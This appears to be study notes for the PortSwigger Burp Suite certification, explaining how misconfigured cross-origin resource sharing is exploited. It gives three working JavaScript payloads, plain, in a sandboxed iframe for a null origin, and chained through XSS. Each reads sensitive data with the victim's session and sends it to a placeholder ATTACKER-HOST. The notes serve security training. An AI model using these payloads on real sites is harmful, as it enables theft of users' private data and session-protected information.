##### PortSwigger BurpSuite Certification Summary
# Cross-Origin Resource Sharing
The same-origin policy allows a domain to issue requests to other domains, but not to access the responses. However, it is often necessary to relax this rule for the sake of functionality. 

If there is a functionality on the site with the header `Access-Control-Allow-Credentials: true` it is possible to send data cross-domain, i.e. to the attacker:
```
<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','VICTIM-HOST/sensitive-data',true);
	req.withCredentials = true;
	req.send();
	
	function reqListener() {
	   location='ATTACKER-HOST?key='+this.responseText;
	};
</script>
```
When the user loads this script, the sensitive data section on the victim host is accessed with the users session and the data sent to the attacker.

## Null Requests
In general, whitelisting is used to check if a cross-origin request should be accepted. For developing reasons, the value `null` is used and allows for sending the origin `null`. One way to trigger such a null-request is sending a suspicious request, such as:
* Serialized data
* The `file:` protocol
* Sandboxed cross-origin requests

A sandboxed environment can be created with iframes:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','VICTIM-HOST/sensitive-victim-data',true);
	req.withCredentials = true;
	req.send();
	
	function reqListener() {
	location='ATTACKER-HOST?key='+this.responseText;
	};
</script>"></iframe>
```

## XSS Vulnerability in Trusted Site
If a trusted website has a XSS vulnerability, it can be used to make the request that extracts sensitive data:
```
https://subdomain.VICTIM-HOST/?xss=<script>cors-stuff-here</script>
```
Example:
```
<script>
document.location="http://subdomain.VICTIM-HOST/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','VICTIM-HOST/sensitive-victim-data',true); req.withCredentials = true;req.send();function reqListener() {location='https://ATTACKER-HOST?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```